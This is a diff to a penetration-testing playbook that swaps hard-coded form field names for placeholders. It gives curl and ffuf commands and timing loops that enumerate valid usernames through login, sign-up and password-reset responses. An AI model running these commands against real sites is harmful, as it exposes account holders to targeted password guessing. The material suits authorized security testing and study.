@@ -31,10 +31,10 @@ Determine which form(s) leak username validity. Send one known-invalid + one pla
 
 ```bash
 echo "--- invalid username ---"
-curl -sX POST -i -d 'username=xyzabc123xxx&password=wrong' http://<host>:<port>/<login_path>
+curl -sX POST -i -d '<login_username_field>=xyzabc123xxx&<login_password_field>=wrong' http://<host>:<port>/<login_form_action>
 echo ""
 echo "--- plausible username ---"
-curl -sX POST -i -d 'username=admin&password=wrong' http://<host>:<port>/<login_path>
+curl -sX POST -i -d '<login_username_field>=admin&<login_password_field>=wrong' http://<host>:<port>/<login_form_action>
 ```
 
 Compare responses. Signal is one of:
@@ -56,10 +56,10 @@ Route:
 
 ```bash
 echo "--- invalid username (should register successfully) ---"
-curl -sX POST -i -d 'username=xyzabc123xxx&email=x@x.com&password=Pass1234&cpassword=Pass1234' http://<host>:<port>/<signup_path>
+curl -sX POST -i -d '<register_username_field>=xyzabc123xxx&<register_email_field>=x@x.com&<register_password_field>=Pass1234&<register_confirm_password_field>=Pass1234' http://<host>:<port>/<register_form_action>
 echo ""
 echo "--- taken username (should fail) ---"
-curl -sX POST -i -d 'username=admin&email=y@x.com&password=Pass1234&cpassword=Pass1234' http://<host>:<port>/<signup_path>
+curl -sX POST -i -d '<register_username_field>=admin&<register_email_field>=y@x.com&<register_password_field>=Pass1234&<register_confirm_password_field>=Pass1234' http://<host>:<port>/<register_form_action>
 ```
 
 Signal: response for taken usernames differs from response for available usernames. Typical messages: `Username already exists`, `Account with this username exists`, `This username is not available`.
@@ -74,10 +74,10 @@ Route:
 
 ```bash
 echo "--- invalid username ---"
-curl -sX POST -i -d 'username=xyzabc123xxx' http://<host>:<port>/<reset_path>
+curl -sX POST -i -d '<forgot_identifier_field>=xyzabc123xxx' http://<host>:<port>/<forgot_form_action>
 echo ""
 echo "--- plausible username ---"
-curl -sX POST -i -d 'username=admin' http://<host>:<port>/<reset_path>
+curl -sX POST -i -d '<forgot_identifier_field>=admin' http://<host>:<port>/<forgot_form_action>
 ```
 
 Signal: response for valid usernames differs from invalid. Typical messages: `Email sent` vs `User not found`, `Reset link sent` vs `No account found`.
@@ -100,19 +100,19 @@ Fuzz username field with fixed invalid password. Filter by the signal identified
 
 **If message-text signal:**
 
-`ffuf -w /usr/share/seclists/Usernames/Names/names.txt -X POST -d 'username=FUZZ&password=wrong' -H 'Content-Type: application/x-www-form-urlencoded' -u http://<host>:<port>/<login_path> -mr '<valid_user_message>' -o found_users_login.csv -of csv`
+`ffuf -w /usr/share/seclists/Usernames/Names/names.txt -X POST -d '<login_username_field>=FUZZ&<login_password_field>=wrong' -H 'Content-Type: application/x-www-form-urlencoded' -u http://<host>:<port>/<login_form_action> -mr '<valid_user_message>' -o found_users_login.csv -of csv`
 
 Where `<valid_user_message>` = the message unique to valid usernames (e.g. `Password incorrect`).
 
 **If length signal (filter by content-length):**
 
-`ffuf -w /usr/share/seclists/Usernames/Names/names.txt -X POST -d 'username=FUZZ&password=wrong' -H 'Content-Type: application/x-www-form-urlencoded' -u http://<host>:<port>/<login_path> -fs <invalid_length> -o found_users_login.csv -of csv`
+`ffuf -w /usr/share/seclists/Usernames/Names/names.txt -X POST -d '<login_username_field>=FUZZ&<login_password_field>=wrong' -H 'Content-Type: application/x-www-form-urlencoded' -u http://<host>:<port>/<login_form_action> -fs <invalid_length> -o found_users_login.csv -of csv`
 
 Where `<invalid_length>` = the response length for invalid usernames. `-fs` filters those out, leaving only differential responses (valid users).
 
 **If status signal (filter by status code):**
 
-`ffuf -w /usr/share/seclists/Usernames/Names/names.txt -X POST -d 'username=FUZZ&password=wrong' -H 'Content-Type: application/x-www-form-urlencoded' -u http://<host>:<port>/<login_path> -fc <invalid_status> -o found_users_login.csv -of csv`
+`ffuf -w /usr/share/seclists/Usernames/Names/names.txt -X POST -d '<login_username_field>=FUZZ&<login_password_field>=wrong' -H 'Content-Type: application/x-www-form-urlencoded' -u http://<host>:<port>/<login_form_action> -fc <invalid_status> -o found_users_login.csv -of csv`
 
 **Extract and append to accumulator:**
 
@@ -132,7 +132,7 @@ Route:
 
 Fuzz username field on sign-up form. Filter by "username taken" signal.
 
-`ffuf -w /usr/share/seclists/Usernames/Names/names.txt -X POST -d 'username=FUZZ&email=x@x.com&password=Pass1234&cpassword=Pass1234' -H 'Content-Type: application/x-www-form-urlencoded' -u http://<host>:<port>/<signup_path> -mr '<username_taken_message>' -o found_users_register.csv -of csv`
+`ffuf -w /usr/share/seclists/Usernames/Names/names.txt -X POST -d '<register_username_field>=FUZZ&<register_email_field>=x@x.com&<register_password_field>=Pass1234&<register_confirm_password_field>=Pass1234' -H 'Content-Type: application/x-www-form-urlencoded' -u http://<host>:<port>/<register_form_action> -mr '<username_taken_message>' -o found_users_register.csv -of csv`
 
 **Extract and append:**
 
@@ -149,7 +149,7 @@ Route: same as Section 2.
 
 Fuzz username field. Filter by valid-user signal (message, length, or status).
 
-`ffuf -w /usr/share/seclists/Usernames/Names/names.txt -X POST -d 'username=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -u http://<host>:<port>/<reset_path> -mr '<valid_user_signal>' -o found_users_reset.csv -of csv`
+`ffuf -w /usr/share/seclists/Usernames/Names/names.txt -X POST -d '<forgot_identifier_field>=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -u http://<host>:<port>/<forgot_form_action> -mr '<valid_user_signal>' -o found_users_reset.csv -of csv`
 
 Adjust `-mr` / `-fs` / `-fc` flag per detected signal type (as in Section 2).
 
@@ -174,7 +174,7 @@ When no message/length/status differential exists but response time differs (ser
 for u in xyzabc123xxx admin; do
   echo "--- $u ---"
   for i in $(seq 1 5); do
-    curl -sX POST -o /dev/null -w '%{time_total}\n' -d "username=$u&password=wrong" http://<host>:<port>/<login_path>
+	curl -sX POST -o /dev/null -w '%{time_total}\n' -d "<login_username_field>=$u&<login_password_field>=wrong" http://<host>:<port>/<login_form_action>
   done
 done
 ```
@@ -185,7 +185,7 @@ Compute median for invalid vs plausible. If plausible-user median > invalid-user
 
 ```bash
 while read u; do
-  t=$(curl -sX POST -o /dev/null -w '%{time_total}' -d "username=$u&password=wrong" http://<host>:<port>/<login_path>)
+	t=$(curl -sX POST -o /dev/null -w '%{time_total}' -d "<login_username_field>=$u&<login_password_field>=wrong" http://<host>:<port>/<login_form_action>)
   awk -v t="$t" 'BEGIN{ if (t+0 > 0.200) exit 0; else exit 1}' && echo "$u" >> users_<host>.txt
 done < /usr/share/seclists/Usernames/Names/names.txt
 sort -u users_<host>.txt -o users_<host>.txt
